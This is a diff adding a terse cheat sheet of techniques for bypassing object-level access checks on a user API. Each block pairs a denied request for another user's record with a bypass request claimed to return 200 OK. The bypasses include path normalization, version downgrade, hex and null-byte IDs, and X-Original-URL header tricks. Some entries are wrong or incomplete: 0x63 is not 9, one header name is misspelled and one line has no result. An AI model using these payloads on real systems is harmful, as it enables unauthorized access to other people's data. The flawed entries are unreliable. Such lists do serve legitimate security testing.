@@ -1,0 +1,91 @@
+//profile
+/api/v5/users/10 => 200 OK
+/api/v5/users/9 => 200 OK
+
+
+
+//profile
+/api/v5/users/10 => 200 OK
+/api/v5/users/9 => 403 / 404 
+
+
+
+//Trailing Slash / Path Normalization
+//profile
+/api/v5/users/10 => 200 OK
+/api/v5/users/9 => 403 / 404 
+/api/v5/users/9/ => 200 OK
+
+
+
+//Double Slash / Obfuscated Path
+//profile
+/api/v5/users/10 => 200 OK
+/api/v5/users/9 => 403 / 404
+/api/v5/users//9// => 200 OK
+
+
+
+//version Downgrade 
+//profile
+/api/v5/users/10 => 200 OK
+/api/v5/users/9 => 403 / 404 
+/api/v2/users/9 => 200 OK
+
+
+
+//SubPath /Endpoint Variant
+//profile
+/api/v5/users/10 => 200 OK
+/api/v5/users/9 => 403 / 404
+/api/v5/users/9/detail => 200 OK
+
+
+
+//Multi-ID / FIlter Parameter Abuse
+//profile
+/api/v5/users/10 => 200 OK
+/api/v5/users/9 => 403 / 404 
+/api/v5/users?id=10,9
+
+
+
+//Type Confusion
+//profile
+/api/v5/users/10 => 200 OK
+/api/v5/users/9 => 403 / 404 
+/api/v5/users/9abc => 200 OK
+
+
+
+//Leading zeros / Hex /Aternate formates
+//profile
+/api/v5/users/10 => 200 OK
+/api/v5/users/9 => 403 / 404 
+/api/v5/users/0x63 => 200 OK
+
+
+
+//NULL / Termination / control - Char Encoding
+//profile
+/api/v5/users/10 => 200 OK
+/api/v5/users/9 => 403 / 404 
+/api/v5/users/9%00 => 200 OK
+
+
+
+//Header/Proxy-Based Bypass
+//profile
+/api/v5/users/10 => 200 OK
+/api/v5/users/9 => 403 / 404 
+/api/v5/users/9 + X-Orginial-URL: /api/v5/users/10
+/api/v5/users/9 + X-Orginial-For: /api/v5/users/10
+
+
+
+//Encoded -Space Tricks
+//profile
+/api/v5/users/10 => 200 OK
+/api/v5/users/9 => 403 / 404 
+/api/v5/users/%209
+
